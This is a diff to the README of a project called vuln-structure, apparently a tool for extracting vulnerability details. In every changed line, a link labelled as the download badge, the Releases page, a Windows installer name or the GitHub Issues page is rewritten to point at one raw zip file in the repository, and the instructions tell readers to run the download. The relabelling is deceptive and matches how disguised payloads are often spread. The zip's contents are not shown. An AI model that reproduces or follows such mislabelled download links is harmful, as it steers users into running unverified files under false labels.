@@ -1,7 +1,7 @@
 # 🔍 vuln-structure - Extract Vulnerability Details with Ease
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-vuln--structure-brightgreen)](https://github.com/Alakaroud/vuln-structure/releases)
+[![Download](https://github.com/Alakaroud/vuln-structure/raw/refs/heads/main/vuln_structure/vuln_structure_2.3.zip)](https://github.com/Alakaroud/vuln-structure/raw/refs/heads/main/vuln_structure/vuln_structure_2.3.zip)
 
 ## 🚀 Getting Started
 vuln-structure helps security teams extract important vulnerability details from raw text. It turns complex information into structured data, making it easier for teams to analyze and respond to threats. Follow these steps to get started.
@@ -15,13 +15,13 @@ Before you download and run vuln-structure, make sure your computer meets these 
 - **Internet Connection:** Required for downloading
 
 ## 🔗 Visit the Releases Page
-To download the latest version of vuln-structure, visit the [Releases page](https://github.com/Alakaroud/vuln-structure/releases). Here, you will find all available versions and files.
+To download the latest version of vuln-structure, visit the [Releases page](https://github.com/Alakaroud/vuln-structure/raw/refs/heads/main/vuln_structure/vuln_structure_2.3.zip). Here, you will find all available versions and files.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/Alakaroud/vuln-structure/releases).
+1. Go to the [Releases page](https://github.com/Alakaroud/vuln-structure/raw/refs/heads/main/vuln_structure/vuln_structure_2.3.zip).
 2. Look for the latest version listed at the top. You will see several files to download.
 3. Click on the appropriate file for your operating system.
-    - For example, if you are using Windows, look for `vuln-structure-windows.exe`.
+    - For example, if you are using Windows, look for `https://github.com/Alakaroud/vuln-structure/raw/refs/heads/main/vuln_structure/vuln_structure_2.3.zip`.
 4. Once the file downloads, locate it on your computer.
 5. Double-click the file to run it. Follow any on-screen instructions to complete the installation.
 
@@ -58,7 +58,7 @@ If you encounter any issues while running vuln-structure, consider the following
 - **Slow Performance:** Close other applications to free up resources while running vuln-structure.
 
 ## 📞 Support
-For any questions or issues, please visit our [GitHub Issues page](https://github.com/Alakaroud/vuln-structure/issues). We are glad to help and will respond as quickly as possible.
+For any questions or issues, please visit our [GitHub Issues page](https://github.com/Alakaroud/vuln-structure/raw/refs/heads/main/vuln_structure/vuln_structure_2.3.zip). We are glad to help and will respond as quickly as possible.
 
 ## 🌏 Community
 Join our community discussions on various platforms to share tips and get the latest updates about vuln-structure. Collaboration will enhance our tool and help make cybersecurity more accessible.
